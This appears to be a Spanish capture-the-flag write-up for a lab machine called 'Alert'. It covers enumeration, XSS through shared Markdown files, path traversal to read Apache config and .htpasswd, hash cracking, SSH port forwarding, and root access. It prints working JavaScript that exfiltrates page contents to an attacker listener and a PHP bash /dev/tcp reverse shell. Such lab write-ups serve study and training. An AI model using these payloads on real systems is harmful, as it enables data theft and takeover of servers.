---
title: "Alert"
date: "2025-03-24T00:04:43-05:00"
type: "maquinas"
draft: false
tags: ["Apache-server", "Port-Fowarding", "XSS", "Cross-Site-Scripting", "Markdown"]
---

## Descripción:
Maquina en la cual se encuentra una visualizador de archivos Markdowns, vulnerable a xss cross site scripting, mediante una opcion para compartir los archivos .md subimos un codigo con la intencion de hacer un phishing y contactar con el administrador para enumerar información sensible.

Ya con un usuario y contraseña se realiza un escalamiento de privilegios mediante un port forwarding debido a un servicio que estaba corriendo como root.

# Enumeración

Con nmap vamos a revisar que puertos estan abiertos y que servicios estan corriendo.

```java
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.36.72 -oG allPorts
```

<a href="https://imgur.com/JhER1OH"><img src="https://i.imgur.com/JhER1OH.png" title="source: imgur.com" /></a>

```java
nmap -sCV -p22,80 10.129.36.72 -oN target
```

<a href="https://imgur.com/kMelVQ1"><img src="https://i.imgur.com/kMelVQ1.png" title="source: imgur.com" /></a>

Podemos ver que en el puerto 80, en la segunda línea, nos aparece la URL del servicio HTTP, por lo que la vamos a agregar al archivo /etc/hosts junto con la IP para poder abrir la página.

```jsx
sudo nano /etc/hosts  
```

Vamos a buscar subdominios con un código de estado diferente a 301 utilizando la herramienta wfuzz.

```jsx
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.alert.htb" http://alert.htb/ | grep -v "301" 
```

<a href="https://imgur.com/rFvhWSc"><img src="https://i.imgur.com/rFvhWSc.png" title="source: imgur.com" /></a>

Vemos que encontramos un subdominio, el cual también se debe agregar al archivo /etc/hosts como `statistics.alert.htb.`

<a href="https://imgur.com/GLzvLHW"><img src="https://i.imgur.com/GLzvLHW.png" title="source: imgur.com" /></a>

En la página que está en el puerto 80, podemos subir archivos Markdown (.md) y enviar una solicitud al administrador.

En el subdominio nos pide una contraseña y no podemos ingrasar

<a href="https://imgur.com/8JFEjs2"><img src="https://i.imgur.com/8JFEjs2.png" title="source: imgur.com" /></a>

Después de buscar, encontramos que podemos ejecutar algunas acciones mediante el archivo Markdown. Además, si subimos el archivo y oprimimos el botón de compartir, podemos enviarle el enlace del archivo a alguien mas.

Podemos comprobar que funciona con una alert en JavaScript:

```jsx
<!-- XSS with regular tags -->
<script>alert(1)</script>
<img src=x onerror=alert(1) />
```

<a href="https://imgur.com/YB2Chwk"><img src="https://i.imgur.com/YB2Chwk.png" title="source: imgur.com" /></a>

# Explotación xss

Podemos probar a obtener información de una de las rutas a las cuales no tenemos acceso, como  `messages`.

```jsx
<script>
fetch("http://alert.htb/messages/")  // Realiza la solicitud GET
  .then(response => response.text())  // Convierte la respuesta en texto
  .then(data => {
    // Luego, realiza la solicitud POST con los datos obtenidos
    return fetch("http://IP:4444/", {
      method: "POST",
      body: data  // Envia los datos obtenidos en el cuerpo de la solicitud POST
    });
  })
  .then(response => response.text())  // Espera la respuesta de la solicitud POST
  .then(result => {
    console.log(result);  // Muestra la respuesta de la solicitud POST
  })
  .catch(error => {
    console.error('Error:', error);  // Maneja errores de las solicitudes
  });
</script>
```

Lo que vamos a hacer es intentar que el administrador abra el archivo por nosotros y nos envíe el contenido, utilizando el código anterior y con nc recibir la respuesta.

Después de subir el archivo, lo que hacemos es darle a 'Compartir' y copiar la URL para luego preparar Netcat y enviar la solicitud al administrador.

```jsx
nc -lvnp 4444
```

<a href="https://imgur.com/OWaQjfE"><img src="https://i.imgur.com/OWaQjfE.png" title="source: imgur.com" /></a>

Pero nos indica lo mismo: que no tenemos permisos.

Si buscamos en Google archivos de configuración predeterminados para un servidor Apache, encontramos la siguiente ruta: `/etc/apache2/sites-enabled/000-default.conf`. Entonces, vamos a repetir lo anterior, cambiando la ruta por un archivo PHP llamado messages.php, seguido del archivo de configuración.

```jsx
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/sites-enabled/000-default.conf")  // Realiza la solicitud GET
  .then(response => response.text())  // Convierte la respuesta en texto
  .then(data => {
    // Luego, realiza la solicitud POST con los datos obtenidos
    return fetch("http://IP:4444/", {
      method: "POST",
      body: data  // Envia los datos obtenidos en el cuerpo de la solicitud POST
    });
  })
  .then(response => response.text())  // Espera la respuesta de la solicitud POST
  .then(result => {
    console.log(result);  // Muestra la respuesta de la solicitud POST
  })
  .catch(error => {
    console.error('Error:', error);  // Maneja errores de las solicitudes
  });
</script>
```

Vemos que hay una ruta a lo que podría ser un archivo con contraseñas llamado `.htpasswd`. Entonces, vamos a hacer el mismo proceso, pero con este nuevo archivo: `http://alert.htb/messages.php?file=../../../var/www/statistics.alert.htb/.htpasswd`

Y recibimos un archivo en el que, al parecer, está un usuario con su hash. Si quieren saber qué tipo de hash es, pueden buscar 'Hash Identifier' y pegarlo, para descifrarlo vamos a usar el siguiente comando:

```bash
# Comando para hashcat
hashcat -m 1600 -a 0 pass.txt /usr/share/wordlists/rockyou.txt
# Comando para John
john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<a href="https://imgur.com/gTdsulp"><img src="https://i.imgur.com/gTdsulp.png" title="source: imgur.com" /></a>

Y obtenemos la contraseña del usuario Albert.

# Root

Nos conectamos como Albert mediante SSH.

```jsx
ssh albert@IP
```

Ya estando dentro del sistema, podemos observar dos cosas. Si usamos el comando id, veremos que nuestro usuario pertenece a un grupo peculiar: uid=1000(albert), gid=1000(albert), groups=1000(albert), 1001(management).

Haciendo uso del siguiente comando, podremos buscar todos los archivos que tengan que ver con dicho grupo en específico.

```jsx
find / -type f -group management 2>/dev/null
```

La salida del comando anterior nos reporta que nuestro usuario tiene permisos completos en `/opt/website-monitor/config/configuration.php`.

Por la ruta absoluta del archivo, podemos inferir que existe otro servicio web local (ya que no fue reportado en nuestro escaneo con nmap).
Vemos los puertos internos en escucha con netstat -tuln:

<a href="https://imgur.com/3mQLSxz"><img src="https://i.imgur.com/3mQLSxz.png" title="source: imgur.com" /></a>

Si usamos ps aux, podremos observar que el servicio está corriendo como root, por lo que procedemos a hacer port forwarding (asegúrate de que tu puerto {port} no esté en uso).

```jsx
ssh -L {port}:localhost:8080 albert@IP
```

Después de revisar `/opt/website-monitor/config/configuration.php` más a detalle, resulta que nuestro usuario tiene permisos completos sobre toda la carpeta /config. A juzgar por lo simple de la aplicación, deberíamos poder acceder a cualquier archivo dentro del directorio `/website-monitor`. Con nuestros permisos de escritura en la carpeta /config, podemos crear un archivo con una revshell PHP alojado en dicha carpeta para obtener una shell como root.

```php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/{IP}/{PORT} 0>&1'"); ?>
```

Para activar el archivo .php, solo es necesario ingresar su ruta en el navegador:

`http://localhost:{port}/config/payload.php`.

<a href="https://imgur.com/lEUrw3A"><img src="https://i.imgur.com/lEUrw3A.png" title="source: imgur.com" /></a>
